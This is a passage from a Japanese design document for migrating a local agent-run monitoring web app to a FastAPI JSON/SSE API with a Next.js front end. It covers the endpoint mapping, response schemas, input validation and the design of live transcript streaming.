5. **localhost 固定は安全装置。** `/dispatch`・`/todo/{id}/run`・`/todo/generate` はサーバ上で `claude -p`(Bash 許可)を起動する = リモートコード実行の露出点。これらの **mutating かつ実行起動系** エンドポイントは、認証セクション(§4)が来るまで `127.0.0.1` バインドを外さない。本セクションでは該当エンドポイントに `x-loop-exec: true` を付け、認証層が必須ゲートを掛ける対象を機械可読にする。

### 2.1 全エンドポイント写像表(現行 Jinja → JSON/SSE API)

API は `/api` プレフィックス配下に置き、ルート `/` は Next が持つ。method・path・request・response・副作用区分を以下に列挙する。`x-loop-exec` 列が ● のものは `claude -p` をサーバ起動する高リスク口。

| # | 現行ルート | 新 method+path | request | response(2xx) | 副作用 | exec |
|---|---|---|---|---|---|---|
| 1 | `GET /` | `GET /api/runs` | query: `verdict?,reviewed?(0/1),task?` | `RunListResponse`(`{runs:[RunRow], verdicts:[str]}`) | A(reindex 実行) | |
| 2 | `GET /run/{id}` | `GET /api/runs/{run_id}` | path: `run_id` | `RunDetail` | none | |
| 3 | (detail 内 evidence) | `GET /api/runs/{run_id}/evidence` | path | `EvidenceMeta` | none | |
| 4 | `GET /run/{id}/file/{name}` | `GET /api/runs/{run_id}/files/{name}` | path | `text/plain`(生テキスト) | none | |
| 5 | `GET /run/{id}/transcript` | `GET /api/runs/{run_id}/transcript` | path | `TranscriptResponse`(`{events:[TranscriptEvent]}`) | none | |
| 6 | `POST /run/{id}/judge` | `POST /api/runs/{run_id}/judgment` | body: `JudgmentInput` | `204 No Content` | A(中継) | |
| 7 | `GET /monitor` | `GET /api/monitor` | — | `MonitorSnapshot` | none | |
| 8 | `GET /monitor/live/{id}` | `GET /api/runs/{run_id}/live` | path | `LiveSnapshot`(roles+status の現状) | none | |
| 9 | `GET /todo` | `GET /api/tasks` | — | `TaskListResponse`(`{tasks:[TaskRow], running:bool}`) | none | |
| 10 | `GET /todo/{id}` | `GET /api/tasks/{task_id}` | path | `TaskDetail`(`{fields:TaskFields, body:str}`) | none | |
| 11 | `GET /todo/new` 補助 | `GET /api/repos` | — | `{repos:[str]}` | none | |
| 12 | `POST /todo/new` | `POST /api/tasks` | body: `TaskInput` | `201`+`{task_id}` | A(write+commit) | |
| 13 | `POST /todo/{id}` | `PUT /api/tasks/{task_id}` | body: `TaskInput`(id 除く) | `200`+`{task_id}` | A(write+commit) | |
| 14 | `POST /todo/{id}/delete` | `DELETE /api/tasks/{task_id}` | path | `204` | A(unlink+commit) | |
| 15 | `POST /todo/{id}/run` | `POST /api/tasks/{task_id}/run` | path | `202`+`RunStartResult` | A(実行起動) | ● |
| 16 | `POST /todo/generate` | `POST /api/tasks/generate` | body: `GenerateInput` | `202`+`{accepted:true}` | A(実行起動) | ● |
| 17 | `POST /dispatch` | `POST /api/dispatch` | — | `202`+`RunStartResult` | A(実行起動) | ● |
| — | (新規)SSE | `GET /api/stream/monitor` | — | `text/event-stream` | none | |
| — | (新規)SSE | `GET /api/runs/{run_id}/stream` | path | `text/event-stream` | none | |
| — | (新規)分析 | `GET /api/analytics/summary` | query: 集計軸 | `AnalyticsSummary` | A(reindex) | |

写像上の **決定(重要)**:

- **メソッドを REST 化する。** 現行は全部 GET/POST だが、新 API では `PUT`(更新)`DELETE`(削除)を使う。理由: HTMX 由来の `POST /todo/{id}/delete` は不要になり、フロントが `DELETE` を直接打てる。
- **判断のエンドポイント名を `judgment` にする。** 現行 `/judge`(動詞)→ `POST /api/runs/{run_id}/judgment`(リソース)。これは「判断という事実を MD に書く中継口」であって「判定する」アクションではない、という §2.0-1 の境界を URL レベルで表明するため。
- **`reviewed` 化を独立エンドポイントにしない。** 現行 `runner.write_judgment` が判断記入と同時に reviewed 化までやる(`set_md_reviewed`)。これを分離すると「判断なしで reviewed だけ立てる」抜け道ができ、種類B のスキップを誘発する。**判断記入と reviewed 化は不可分のまま** `POST /api/runs/{run_id}/judgment` 1 本に閉じ込める(決定)。

### 2.2 主要レスポンスの JSON 形(実コードに接地)

#### RunRow(`GET /api/runs` の各行 / `GET /api/monitor` の recent)

`loopdb.COLUMNS`(`loopdb.py:12`)をそのまま写したもの。db は使い捨てなので、この形は **MD front-matter の射影**にすぎない。`_reindex_and_query`(`webapp/main.py:47`)が返す `dict(row)` と完全一致させる。

```json
{
  "run_id": "2026-06-16-101500-fix-login",
  "task": "fix-login",
  "verdict": "pass",
  "reviewed": 0,
  "model": "claude-...",
  "cost_usd": 0.42,
  "turns": 12,
  "duration_ms": 83000,
  "session_id": "…",
  "repo_sha": "…", "skill_sha": "…", "goal_contract_sha": "…",
  "started_at": "2026-06-16T10:15:00+09:00",
  "md_path": "2026-06-16-101500-fix-login.md",
  "test_verdict": "pass", "verifier_verdict": "pass",
  "verifier_confidence": "high", "repo": "/Users/…/repo"
}
```

`repo_label`(`webapp/main.py:33`)はサーバの表示整形ロジックなので、**API は raw `repo` を返し、ラベル化はフロント(`lib/repoLabel.ts`)へ移す**(決定)。事実とその表示を分離し、API を純データに保つ。

#### RunDetail(`GET /api/runs/{run_id}`)

`detail`(`webapp/main.py:83`)が組む辞書を JSON 化。**MD を直接 parse** する(db ではない)。`summary` は `## エージェントがやったこと` セクションの抽出(`main.py:91-94`)、`verifier` は `runs/<id>/verifier.json`、`judgment` は `runner.parse_judgment`、`fields` は `runner.JUDGMENT_FIELDS`。

```json
{
  "run_id": "2026-06-16-101500-fix-login",
  "front_matter": { "task": "fix-login", "verdict": "pass", "reviewed": "false", "...": "…" },
  "summary": "Implementer の最終出力(runner が再要約しない事実テキスト)",
  "verifier": {
    "verdict": "pass", "confidence": "high", "test_gaming_suspected": false,
    "reasons": "…", "criteria": [{"criterion": "…", "met": true, "evidence": "…"}]
  },
  "judgment": { "trust": "", "risk": "", "checks": "", "learning": "" },
  "judgment_fields": [["trust","信用できるか"],["risk","失敗/リスク"],
                      ["checks","自動検証に入れるべきチェック"],["learning","学び"]],
  "evidence": { "change.patch": true, "test-output.txt": true, "transcript": true }
}
```

**決定: `evidence` は `_evidence`(`main.py:73`)の「全文を JSON へ詰める」をやめ、存在フラグ(bool)だけ返す。** patch / test-output の本文は #4 `GET /api/runs/{run_id}/files/{name}` で個別取得する。理由: change.patch は数 KB〜数百 KB になりうる。一覧詳細 JSON を軽く保ち、本文はオンデマンドで遅延ロード(フロントはタブ展開時に fetch)。

#### EvidenceMeta(`GET /api/runs/{run_id}/evidence`)

`runs/<id>/` 配下の証拠ファイル一覧をメタだけ返す(本文は #4)。

```json
{
  "files": [
    {"name": "change.patch", "size": 4210, "exists": true},
    {"name": "test-output.txt", "size": 980, "exists": true},
    {"name": "transcript.jsonl", "size": 120400, "exists": true},
    {"name": "verifier.json", "size": 610, "exists": true}
  ]
}
```

#### TaskRow / TaskFields(`GET /api/tasks`, `GET /api/tasks/{id}`)

`runner.parse_tasks`(`runner.py:71`)+ `_latest_runs`(`main.py:174`)+ `_fields_from_fm`(`main.py:130`)に対応。`_path`(Path)は JSON に漏らさない(決定: シリアライズ対象外。内部実装詳細でありパス露出になる)。

```json
// TaskRow(一覧)
{ "id": "fix-login", "goal": "…", "status": "todo", "repo": "myrepo",
  "last_run": { "run_id": "…", "verdict": "pass" } }

// TaskDetail(編集フォーム prefill)
{ "fields": {
    "task_id": "fix-login", "goal": "…", "repo": "myrepo",
    "accept": ["…","…"], "verify": "pytest -q", "constraints": ["…"],
    "allowed_tools": "Read, Edit, Write, Grep, Glob, Bash",
    "max_attempts": "", "status": "todo" },
  "body": "補足メモ(front-matter 外)" }
```

`accept` / `constraints` は **配列のまま**返す(`_fields_from_fm` がリスト保持しているのと同じ。行 UI 用)。`allowed_tools` はカンマ連結文字列で返す(現行踏襲)。

#### MonitorSnapshot(`GET /api/monitor`)

`monitor`(`main.py:210`)に対応。`status` は `_read_run_status`(`main.py:187`)= `data/.run.lock` の JSON に `elapsed`(秒)を付与したもの。実行中でなければ `null`。

```json
{
  "status": { "run_id": "…", "task": "…", "repo": "…",
              "started_at": "…", "phase": "implementer", "elapsed": 47 },
  "recent": [ /* RunRow の縮約: run_id,task,verdict,reviewed,repo,started_at */ ],
  "unreviewed": 3,
  "pending": 5,
  "phases": [["explorer","Explorer"],["implementer","Implementer"],["verifier","検証/Verifier"]]
}
```

#### TranscriptEvent(`GET /api/runs/{run_id}/transcript` と SSE 共通)

`_parse_transcript`(`main.py:350`)の `events` をそのまま JSON 配列に。**この関数はロジックの肝なので二重化しない** — `webapp/main.py` から `loop_transcript.py`(新規 util)へ抽出し、REST と SSE の両方が import する(§3 でも同関数を使う)。

```json
{ "events": [
  {"cls":"user","label":"プロンプト","body":"…","ts":"10:15:02"},
  {"cls":"think","label":"思考","body":"…","ts":"10:15:05","collapse":true},
  {"cls":"tool","label":"🔧 Edit","body":"{json}","ts":"10:15:06","collapse":false},
  {"cls":"result","label":"↩ 結果","body":"…","ts":"10:15:07","collapse":true}
]}
```

### 2.3 SSE エンドポイント(§3 と矛盾しない最小予約宣言)

リアルタイム機構の詳細(tail 戦略・再接続・複数 run 多重化)は §3 が定義する。本セクションは **API カタログ上の URL とイベント型の予約だけ**を行い、REST の `GET /api/runs/{id}/transcript`(=完了 run のスナップショット)と SSE(=進行中の追記)の役割境界を確定する。

- `GET /api/stream/monitor` — Content-Type `text/event-stream`。`event:` 型を予約:
  - `status`(`data: MonitorSnapshot.status`、`.run.lock` 変化時)
  - `run_done`(`data: {run_id}`、新 run MD 出現時の一覧再取得トリガ)
  - `heartbeat`(接続維持)
- `GET /api/runs/{run_id}/stream` — 進行中 run のライブ transcript。`event:` 型を予約:
  - `event`(`data: TranscriptEvent`、role stream の新規行を §2.2 と同型で配信。`role` フィールドを 1 つ追加)
  - `phase`(`data: {phase}`、`.run.lock` の phase 遷移)
  - `end`(run 終了。フロントは REST 詳細へ切替)

**決定: SSE は「事実イベントの追記専用」とし、判断や要約を一切流さない。** TranscriptEvent は LLM の生発話/ツール使用そのものであり、runner も再要約しない方針(`write_run_md` の summary 注記)と一致する。§2.0-1 の制約は SSE でも保たれる。

### 2.4 入力検証(移行後も保つ)

現行の防御を Pydantic + 依存関数に移植し、**1 箇所たりとも緩めない**。

**(a) `_safe_id`(`main.py:123`)→ Pydantic バリデータ + パス依存。**
task_id / run_id は path パラメータに来るが、FastAPI の path 変換はトラバーサルを止めない。共通依存 `valid_task_id` / `valid_run_id` を作り、`_SAFE_ID`(`^[A-Za-z0-9][A-Za-z0-9._-]*$`)・先頭 `_`/`.` 拒否・`/` 拒否を再利用する。`runner._safe_task_id`(生成側のサニタイズ)とは役割が違う(あちらは整形、こちらは拒否)ので両方残す。

```python
def valid_run_id(run_id: str) -> str:
    rid = _safe_id(run_id)              # 既存関数を webapp から共有 util へ移し再利用
    if rid is None:
        raise HTTPException(400, detail=err("bad_id", "不正な id"))
    return rid
```

**(b) evidence_file の startswith チェック(`main.py:402-407`)を維持。**
#4 `GET /api/runs/{run_id}/files/{name}` は現行と同じく `resolve()` 後に `startswith((RUNS/run_id).resolve())` を確認する。`name` にも `_safe_id` 相当を掛け、`..` 混入を二重に止める。許可するファイル名は **allowlist 化**(決定): `change.patch` / `test-output.txt` / `verifier.json` / `*.stream.jsonl` / `*.result.json` / `*.stderr.log` / `transcript.jsonl` のみ返す。理由: `runs/<id>/` 配下に将来別ファイルが増えても、無条件配信にならない。

**(c) `monitor_live` の `"/" in run_id or ".." in run_id` チェック(`main.py:227`)** は `valid_run_id` 依存に吸収して重複排除。

**Pydantic モデル方針(決定):**
- 入力モデル(`TaskInput`/`JudgmentInput`/`GenerateInput`)は `extra="forbid"` で未知フィールド拒否。判断系で勝手なキーを差し込ませない。
- 出力モデルは作るが**整形を入れない**。`RunRow` は `loopdb.COLUMNS` と機械的に一致(乖離防止のため `model_config` でフィールド名を COLUMNS から検証するテストを 1 本置く)。
- front-matter のような自由形 dict は `dict[str, Any]` で素通し(parse_front_matter は型強制しない設計を尊重)。

`TaskInput` / `JudgmentInput` の定義スケッチ:

```python
class TaskInput(BaseModel):
    model_config = ConfigDict(extra="forbid")
    task_id: str | None = None          # POST 時のみ。PUT は path から取る
    goal: str = ""
    repo: str = ""
    accept: list[str] = []
    verify: str = ""
    constraints: list[str] = []
    allowed_tools: str = ""
    max_attempts: str = ""              # 現行同様 str 受けし _fm_from_form で int 化
    status: str = "todo"
    body: str = ""

class JudgmentInput(BaseModel):
    model_config = ConfigDict(extra="forbid")
    trust: str = ""; risk: str = ""; checks: str = ""; learning: str = ""
```

`status` の `_STATUSES`(`main.py:120`)許可集合チェックは `_fm_from_form`(`main.py:170`)が既にやっているので、ハンドラは `runner` 経由の既存ロジックに委ね、API 側で二重定義しない。

### 2.5 ハンドラ実装スケッチ(ロジック二重化を避ける薄さ)

書き込み 3 本は **runner の関数をそのまま呼ぶ**だけにする。現行 `webapp/main.py` の `todo_create`/`todo_save`/`judge` と同じ呼び出し列を JSON 化する。

```python
@app.post("/api/tasks", status_code=201)
def create_task(inp: TaskInput):
    tid = _safe_id(inp.task_id or "")
    if not tid:
        raise HTTPException(400, err("bad_id", "不正な id です"))
    if (runner.TASKS_DIR / f"{tid}.md").exists():
        raise HTTPException(409, err("exists", f"既に存在します: {tid}"))
    fm = _fm_from_form(tid, inp.goal, inp.repo, inp.accept, inp.verify,
                       inp.constraints, inp.allowed_tools, inp.max_attempts, inp.status)
    p = runner.write_task(tid, fm, inp.body)
    runner.auto_commit(runner.DATA, [p], f"todo: {tid} を新規作成")
    return {"task_id": tid}

@app.post("/api/runs/{run_id}/judgment", status_code=204,
          openapi_extra={"x-loop-kind": "A(中継)"})
def put_judgment(run_id: str = Depends(valid_run_id), inp: JudgmentInput = Body(...)):
    if not (runner.RUNS / f"{run_id}.md").exists():
        raise HTTPException(404, err("not_found", f"run not found: {run_id}"))
    runner.write_judgment(run_id, inp.model_dump(), runner.load_config())  # 素通し
```

実行起動 3 本(#15/#16/#17)は現行の `subprocess.Popen([... "runner.py" ...])`(`main.py:283,335,413`)をそのまま流用し、`202 Accepted` を返す。**dispatch / run を直列化する `.run.lock`(`runner.cmd_run` の `O_EXCL`)はサーバ側に持ち込まない** — runner が自前で atomic claim するので、API は二重 Popen を投げても runner が「別の run が進行中」で弾く。ただし UX 上は事前に `.run.lock` 存在を見て `409 Conflict`+`RunStartResult{accepted:false, reason:"busy"}` を返す(現行 `todo_run` の `started=busy` 相当)。

> 並列 run / data への commit race(index.lock 競合)は本セクションの API 形では解決しない。`.run.lock` による直列実行という本質ボトルネックは §1(アーキ)/§5(スケール)の論点であり、ここでは「API は runner の直列化を尊重し、busy を 409 で素直に返す」決定に留める。

### 2.6 「GUI は判断を生成しない」を API 境界で担保する

URL とモデルだけでは「サーバが判断を補完しない」ことは保証できない。次の**機械的ガード**を置く(決定):

1. `JudgmentInput` は `trust/risk/checks/learning` の 4 フィールドのみ・`extra="forbid"`・**デフォルトはすべて空文字**。サーバはどのフィールドにも値を合成しない。`put_judgment` は `inp.model_dump()` を `runner.write_judgment` に**無変換**で渡す(上スケッチの通り)。
2. `runner.write_judgment` は受け取った文字列を MD の `### 見出し`配下へ置換し、空なら空のまま書く(`runner.py:756-760`)。**runner も生成しない**ことを単体テストで固定: 入力が全空なら判断セクションも全空、を assert。
3. judgment 系ハンドラに `import` 制約のリント(CI)を掛け、`anthropic` / `claude` / `openai` 等の LLM 呼び出しシンボルが webapp の judgment 経路に現れたら fail させる。生成口は `runner.generate_task`(タスク**設計**であり判断ではない)1 箇所だけに隔離する。
4. OpenAPI に `x-loop-kind: A(中継)` を付け、`/docs` と型生成物の双方で「これは中継口」と明示。レビュー時に判断系へロジックが混入していないかを diff で検知しやすくする。

### 2.7 エラーモデルと OpenAPI → Next 型生成

**統一エラー JSON(決定):**

```json
{ "error": { "code": "not_found", "message": "run not found: …", "detail": null } }
```

- `400 bad_request`(不正 id / バリデーション): `_safe_id` 失敗・`extra="forbid"` 違反。
- `404 not_found`: task/run MD 不在(現行の `HTMLResponse(..., 404)` 群を写像)。
- `409 conflict`: task 既存(`POST /api/tasks`)/ run busy(`.run.lock` あり)。
- FastAPI の `RequestValidationError` を `exception_handler` で上記形に正規化(デフォルトの `detail:[...]` 形をフロントが扱いやすい単一 envelope に統一)。

```python
def err(code: str, message: str, detail=None):
    return {"error": {"code": code, "message": message, "detail": detail}}
```

**OpenAPI → Next 型(決定):** FastAPI の自動 `/openapi.json` を唯一のスキーマ源とし、フロントは `openapi-typescript` で `lib/api/schema.d.ts` を生成、`openapi-fetch` で型安全クライアントを作る。**zod は OpenAPI から派生生成**(`openapi-zod-client` 等)し、SSE で流れる `TranscriptEvent` / `MonitorSnapshot.status` のように OpenAPI の responses に載らない型は、**Pydantic モデルを `components.schemas` に手動登録**(空の `GET /api/_schemas/sse` ダミー or `app.openapi()` 拡張)してフロントと共有する。理由: SSE ペイロードの型を手書きで二重定義すると、`_parse_transcript` の出力形が変わったときに静かに壊れる。Pydantic を単一源にして型ドリフトを CI で検出する。

ビルド統合: `uvicorn` 起動 → `curl /openapi.json` → `openapi-typescript` を Next の `prebuild` script に組み込み、API とフロント型を 2 プロセス間で同期させる。

### 2.8 移行順序(実装者向け)

1. `_parse_transcript` / `_safe_id` / `_evidence` を `webapp/` 内の共有 util へ抽出(REST・SSE・既存 Jinja が同関数を使う)。
2. 読み取り系(#1–#11)を `/api/*` で先に立てる。Jinja ルートは当面残し、Next から段階移行。
3. 書き込み系(#12–#14)を `runner.write_task`/`auto_commit` 素通しで実装。
4. 実行起動系(#15–#17)を `202` で実装。`x-loop-exec: true` を付け、§4 認証層が来るまで `127.0.0.1` バインド据え置き。
5. SSE 2 本(§3 が主担当)。本セクションは URL/イベント型の予約のみ提供済み。
6. Jinja ルート・テンプレートを撤去。

---

<a id="3"></a>

## 3. リアルタイム監視と並行 run 同時表示(SSE)

### 3.0 このセクションの目的と現状

現状の監視 UI(`webapp/main.py` の `monitor` / `monitor_live`)は、`meta http-equiv="refresh"`(2-3 秒)でページ全体を再読み込みして「進行中 run の transcript」を更新している。これには次の問題がある。

- 全文再描画でスクロール位置・展開状態(`<details>` の collapse)が毎回リセットされる。
- 2-3 秒粒度なので「いま何をしているか」の即時性が乏しい。
- `monitor_live` は単一 run 固定。並行 run(セクション4で導入)を 1 画面で見る構造がない。
- 毎リフレッシュで `*.stream.jsonl` 全体を読み直し `_parse_transcript` で全イベントを畳み直すため、run が長くなると線形に重くなる。

本セクションは、この meta refresh を **SSE(Server-Sent Events)** に置き換え、(a) 個別 run のライブ transcript を増分 push、(b) `monitor` トップの全体ステータス(進行中 run の phase/elapsed)を push、の 2 系統を設計する。並行実行(セクション4)が来たとき N 本同時購読へ自然に拡張できる形を最初から採る。

**中心思想との整合(再確認):** SSE で流すのは「runner が `*.stream.jsonl` / `.run.lock` に書いた事実」と「runner の `_parse_transcript` 相当が畳んだ表示用イベント」だけである。GUI 側は判断を生成・要約・推奨しない。transcript の `assistant` テキストは Implementer 自身の出力であり、GUI が新たに要約を作ることはしない(`collapse` などの**表示折り畳みフラグ**は事実の欠落を伴わない純粋な UI ヒントなので可)。`*.stream.jsonl` と `.run.lock` は file-based contract 側(`runner.DATA` 配下)の生成物であり、loop.db には一切触れない(進行中 run はまだ MD 化されておらず、loop.db に行が無いのが正しい)。

### 3.1 接地: runner が書く 2 つの一次ソース

実装は推測ではなく以下の実コードの出力形に依存する。

**(A) `runs/<run_id>/<role>.stream.jsonl`**(`runner.run_role`、`runner.py:335` 周辺)

`claude -p --output-format stream-json --verbose` の stdout を 1 行 1 イベントで**逐次 flush しながら**追記する(`sf.write(line); sf.flush()`)。`role` は `explorer` / `implementer` / `verifier`。実イベントの `type` 分布を実ファイルで確認済み:

- `system`(`subtype: hook_started/...` 等。init やフック)
- `assistant`(`message.content[]` に `thinking` / `text` / `tool_use`)
- `user`(`message.content[]` に `tool_result`)
- `rate_limit_event`
- `result`(最終 1 行。`is_error` / `total_cost_usd` / `num_turns` / `session_id` / `result`(最終テキスト)等を持つ。**この行が出たら role 終了**)

重要: この `assistant`/`user` の `message.content[]` の形は `webapp/main.py:350` の `_parse_transcript` がそのまま畳める形と**同一**(検証済み)。つまり `_parse_transcript` は stream.jsonl にも transcript.jsonl にも使える。stream にしか無い `system`/`rate_limit_event`/`result` は `_parse_transcript` が既に `type not in ("user","assistant")` で捨てている。なお stream 行は top-level `timestamp` を持たないことが多く、現状 `_parse_transcript` の `ts = (o.get("timestamp") or "")[11:19]` は空文字になる(壊れはしない)。

**(B) `data/.run.lock`**(`runner.write_run_status`、`runner.py:280`)

ロック兼ステータスファイル。`cmd_run` が `O_EXCL` で作成(空ファイル=claim)、その後 `_run_attempt` が phase 遷移ごとに JSON を上書きする:

```json
{"run_id":"2026-06-16-191437-hello-loop","task":"hello-loop","repo":"/path/repo","started_at":"2026-06-16T19:14:37+09:00","phase":"implementer"}
```

`phase` は `explorer` → `implementer` → `verifier` の順に書き換わる(`runner.py:807,815,836`)。run 終了時に `cmd_run` の `finally` で `lock.unlink()`(`runner.py:938`)。よって **ファイル消滅 = run 終了**。`webapp/main.py:187` の `_read_run_status` がこれを読み `elapsed` を算出する。

### 3.2 全体設計: 2 つの SSE エンドポイント + 共通 tail ユーティリティ

```
[Next.js]  monitor/page.tsx ──EventSource──▶ GET /api/monitor/stream         (全体: lock 変化)
           run/[id]/live ────EventSource──▶ GET /api/runs/{id}/live          (1 run の3役を畳んで push)
                                            └ クエリ ?roles=explorer,implementer,verifier
[FastAPI]  共通: tail_jsonl()  / watch_lock()
```

FastAPI は `StreamingResponse(media_type="text/event-stream")` を返す層に徹する。`runner` / `loopdb` の **import は維持**(`webapp/main.py:24-26` のまま)。SSE のイベント整形に `runner._parse_transcript`(現状 `webapp/main.py` 側にあるが、後述の通り runner へ移設推奨)を再利用してロジック二重化を避ける。

### 3.3 サーバ側 (1): 個別 run のライブ transcript SSE

#### エンドポイント署名

```
GET /api/runs/{run_id}/live?roles=explorer,implementer,verifier
  -> StreamingResponse(media_type="text/event-stream")
  Header: Last-Event-ID(再接続時にブラウザが自動付与)
```

#### イベント設計(SSE フレーム)

SSE は `id:` / `event:` / `data:` の 3 行 + 空行が 1 フレーム。`id` に「畳み済みイベントの通し番号」を入れ、再接続時の Last-Event-ID で「どこから再送するか」を決める。`event` 型は次の 4 種:

| event | data(JSON) | 意味 |
|---|---|---|
| `transcript` | `_parse_transcript` が返す 1 イベント dict に `role` と `seq` を付与 | 会話イベント 1 件 |
| `phase` | `{"role":"implementer","status":"running"}` 等 | role の開始/終了(stream に `result` 行が出た) |
| `heartbeat` | `{"t": 1718...}` | 接続維持(コメント行 `: ` でも可) |
| `done` | `{"reason":"lock-gone"}` | run 全体終了。クライアントは close |

`data` の JSON 例(`transcript`):

```json
{"role":"implementer","seq":42,"cls":"tool","label":"🔧 Edit",
 "body":"{...}","ts":"","collapse":true}
```

`cls`/`label`/`body`/`collapse` は **既存 `_parse_transcript` の出力キーをそのまま使う**(フロントの表示分岐を現行 monitor_live.html から移植しやすくするため)。

#### tail の実装スケッチ

ファイル末尾追従は inotify 相当が macOS に無いため、**stat ベースのポーリング tail**(オフセット記憶)にする。watchdog 等の追加依存は監視対象がプロセス内生成ファイルで信頼境界も同一のため**不採用**(依存とプロセス間 race を増やすだけ)。

```python
# webapp/sse.py（新規）
import asyncio, json
from pathlib import Path

POLL_SEC = 0.4          # tail ポーリング間隔（後述の根拠）
HEARTBEAT_SEC = 15

async def tail_jsonl(path: Path, start_offset: int):
    """path を末尾追従し (offset, raw_line) を yield。ファイル未生成も待つ。"""
    offset = start_offset
    while True:
        if path.exists():
            size = path.stat().st_size
            if size < offset:        # ローテーション/再作成は無いが安全側
                offset = 0
            if size > offset:
                with path.open("r", encoding="utf-8") as f:
                    f.seek(offset)
                    for line in f:
                        if line.endswith("\n"):     # 半端な行は次回まで待つ
                            offset += len(line.encode("utf-8"))
                            yield offset, line
                        else:
                            break
        yield None, None             # tick（呼び出し側で heartbeat / 終了判定）
        await asyncio.sleep(POLL_SEC)
```

エンドポイント本体(role を横断して 1 ストリームに多重化し、`.run.lock` 消滅で `done`):

```python
@app.get("/api/runs/{run_id}/live")
async def run_live(run_id: str, request: Request, roles: str = "explorer,implementer,verifier"):
    rd = RUNS / run_id
    if "/" in run_id or ".." in run_id or not rd.is_dir():
        return JSONResponse({"error": "not found"}, status_code=404)
    role_list = [r for r in roles.split(",") if r in ("explorer", "implementer", "verifier")]
    last_id = int(request.headers.get("Last-Event-ID") or 0)

    async def gen():
        seq = 0
        tails = {r: runner_parse_tail(rd / f"{r}.stream.jsonl") for r in role_list}
        last_beat = time.monotonic()
        # role ごとに直列で追従（3役は時間的に重ならない＝Explorer→Implementer→Verifier）
        for role in role_list:
            path = rd / f"{role}.stream.jsonl"
            role_done = False
            async for off, raw in tail_jsonl(path, 0):
                if await request.is_disconnected():
                    return
                if raw is not None:
                    for ev in fold_line(raw):        # _parse_transcript を 1 行版にしたもの
                        seq += 1
                        if seq <= last_id:           # 再接続: 既送分はスキップ
                            continue
                        ev["role"] = role; ev["seq"] = seq
                        yield sse(seq, "transcript", ev)
                    if line_is_result(raw):          # role 終了
                        yield sse(seq, "phase", {"role": role, "status": "done"})
                        role_done = True
                # tick: heartbeat と全体終了判定
                now = time.monotonic()
                if now - last_beat > HEARTBEAT_SEC:
                    last_beat = now
                    yield sse(seq, "heartbeat", {"t": int(now)})
                if role_done:
                    break
                if not (runner.DATA / ".run.lock").exists() and not path.exists():
                    break                            # lock 無し かつ この role 未生成 = この run は非進行
        yield sse(seq, "done", {"reason": "roles-complete"})
    return StreamingResponse(gen(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
```

`sse()` は単純なフレーム整形:

```python
def sse(eid, event, data):
    return f"id: {eid}\nevent: {event}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n"
```

#### 「過去 run のライブ再生 + 進行中 run」を同一 UI で扱う(必須要件)

`run_live` は **進行中かどうかを問わない**。`.run.lock` が無い(=完了済み)run でも、`tail_jsonl(path, 0)` は既存の全行を最初の数 tick で吐き切り、`result` 行で `phase done` を出し、最後に `done` を送って閉じる。つまり完了 run に対しては「全イベントを SSE で順に流して即終了」になり、進行中 run に対しては「途中まで流して以降を追従」になる。**クライアントは両者を区別せず同じ EventSource で扱える**。これが「過去 run のライブ再生」と「進行中 run」を 1 UI に統合する鍵。

完了 run を毎回フル再送するのが無駄なケース(長い transcript を何度も開く)に備え、フロントは Last-Event-ID ではなく「初回ロード時は REST で確定 transcript を取得 → SSE は増分のみ」の二段構えも選べる。ただし**推奨は単純化のため SSE 一本**(3.7 参照)。

#### サーバ畳み込み vs クライアント畳み込み —— 決定: サーバ畳み込み

`_parse_transcript` 相当(JSONL → `{cls,label,body,collapse}`)を**サーバ側で行う**。理由:

- ロジックが既に Python(`runner`/`webapp`)にあり、フロントへ移すと**二重実装**になる(刷新方針「runner/loopdb の直接 import を維持してロジック二重化を避ける」に反する)。
- stream-json の生イベントは `system`/`rate_limit_event`/`hook_*` などノイズが多い。境界で落とす方が転送量・フロント実装が軽い。
- 「GUI は要約しない」制約上、畳み込みは**事実の選別と整形に限定**すべきで、サーバ(file-based contract に近い側)で行う方が「engine が事実を、Next は表示を」の役割分担に沿う。

そのため `_parse_transcript` を `webapp/main.py:350` から **`runner.py` へ移設**し(1 行版 `fold_line` も runner に置く)、REST transcript と SSE の両方が同一関数を呼ぶ。`/run/{id}/transcript` の確定表示も同関数を使う。

### 3.4 サーバ側 (2): monitor 全体ストリーム(`.run.lock` 変化の push)

#### エンドポイント署名

```
GET /api/monitor/stream  -> StreamingResponse(text/event-stream)
```

#### push 方式 —— 決定: poll-then-push(差分があれば送る)

`.run.lock` は単一ファイル・低頻度更新。watchdog を入れるほどの対象ではない。**0.5 秒ポーリングして JSON が前回と変わったときだけ push**する。`_read_run_status`(`webapp/main.py:187`)をそのまま使い `elapsed` も同関数で算出。`elapsed` は毎秒変わるので、push 条件は「`phase`/`run_id` の変化」または「無 push が `elapsed_push_sec`(例 2 秒)続いたとき」にして、elapsed 更新の見かけは一定間隔に保つ。

```python
@app.get("/api/monitor/stream")
async def monitor_stream(request: Request):
    async def gen():
        prev_key = None; last_push = 0.0
        while True:
            if await request.is_disconnected():
                return
            st = _read_run_status()          # None=idle
            key = None if st is None else (st.get("run_id"), st.get("phase"))
            now = time.monotonic()
            changed = key != prev_key
            if changed or now - last_push > 2.0:
                prev_key = key; last_push = now
                yield sse_named("status", st or {"idle": True})  # elapsed 込み
            await asyncio.sleep(0.5)
    return StreamingResponse(gen(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
```

`status` イベントの `data` 例:

```json
{"run_id":"2026-06-16-191437-hello-loop","task":"hello-loop",
 "repo":"/path","phase":"implementer","elapsed":73}
```

idle 時:

```json
{"idle": true}
```

**並行 run への自然拡張(セクション4の前提):** 現状の `.run.lock` は単一 run しか表現できない。セクション4で並列化する際は「`.run.lock` 単一ファイル」を「`runs/<id>/.status.json` を各 run が書き、`monitor_stream` は `runs/*/.status.json` を glob して配列で push」へ拡張する。本セクションの `monitor_stream` は**最初から「進行中 run の配列」を返す形にしておく**:

```json
{"runs":[{"run_id":"...","phase":"implementer","elapsed":73}]}
```

単一 run の今は配列長 0/1。フロントは配列を grid に並べるので、N>1 でコード変更不要。`_read_run_status` は当面この配列の唯一要素を生成するアダプタにする(`.run.lock` を読んで `[st]` を返す)。これで「並列が来たら供給側(runner の status 書き出し)だけ差し替えれば UI は変えない」。

### 3.5 フロント側: Next.js + shadcn/ui

#### 受信方式 —— 決定: `EventSource`(標準)

